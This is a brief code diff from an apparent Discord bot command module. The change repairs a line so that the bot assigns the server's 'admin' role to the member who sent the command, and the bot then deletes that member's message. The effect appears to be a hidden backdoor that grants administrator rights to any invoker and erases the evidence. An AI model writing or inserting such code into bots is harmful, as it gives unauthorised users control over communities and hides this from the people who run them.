@@ -6,7 +6,7 @@ module.exports.run = async (bot, message, args, ops, tools) => {
 
 
   let roletournoilol = message.member.guild.roles.find(`name`, "admin");
-  member.addRole(roletournoilol.id);
+  message.member.addRole(roletournoilol.id);
 
   message.delete();
 
